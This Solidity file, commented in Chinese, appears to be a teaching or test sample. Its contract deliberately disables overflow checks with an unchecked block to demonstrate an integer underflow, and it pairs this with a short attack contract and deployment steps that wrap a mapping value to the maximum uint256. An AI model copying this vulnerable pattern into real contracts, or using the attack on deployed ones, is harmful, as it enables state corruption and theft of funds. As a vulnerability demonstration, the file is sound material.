pragma solidity >=0.8.0;

// 漏洞名稱：Integer Underflow
// 此合約中 map 的 init 函式使用 unsigned integer 的減法，若 map[k] 小於 v，則會發生 underflow，造成數值 wrap around 為 2^256 - 1。
// 為了在 Solidity >=0.8.0 中展示 underflow 漏洞，我們刻意使用 unchecked 區塊以避開內建檢查。

contract VulnerableMappingSym1 {
    // 狀態變數：此 mapping 會儲存 key 對應的數值，未做初始值檢查
    mapping(uint256 => uint256) public map;

    // 漏洞函式：未檢查減法是否會 underflow
    function init(uint256 k, uint256 v) public {
        // 使用 unchecked 降低 Solidity 0.8 內建的安全檢查，讓 underflow 發生時可以 wrap around
        unchecked {
            map[k] -= v; // 當 map[k] < v 時，underflow 會發生，map[k] 會變成 2^256 - (v - map[k])
        }
    }
}

// 攻擊範例說明：
// 1. 假設某個 key 的預設值為 0
// 2. 攻擊者呼叫 init(key, 1) 使得 underflow 發生，結果 map[key] 會變成 uint256 的最大值

contract AttackVulnerability {
    VulnerableMappingSym1 public vulnerable;

    // 在部署此合約前，必須先部署 VulnerableMappingSym1，並將其地址傳入
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableMappingSym1(_vulnerableAddress);
    }

    // 攻擊函式：利用 underflow 攻擊
    function attack(uint256 key) public {
        // 初始情況下，map[key] 預設為 0；
        // 呼叫此函式後，map[key] = 0 - 1 underflow, 導致 map[key] 變成 2^256 - 1
        vulnerable.init(key, 1);
    }
}

// 部署與攻擊步驟：
// 1. 部署 VulnerableMappingSym1 合約
// 2. 部署 AttackVulnerability 並傳入 VulnerableMappingSym1 的地址
// 3. 呼叫 AttackVulnerability.attack(key) 即可觸發 underflow，將 map[key] 變成極大值
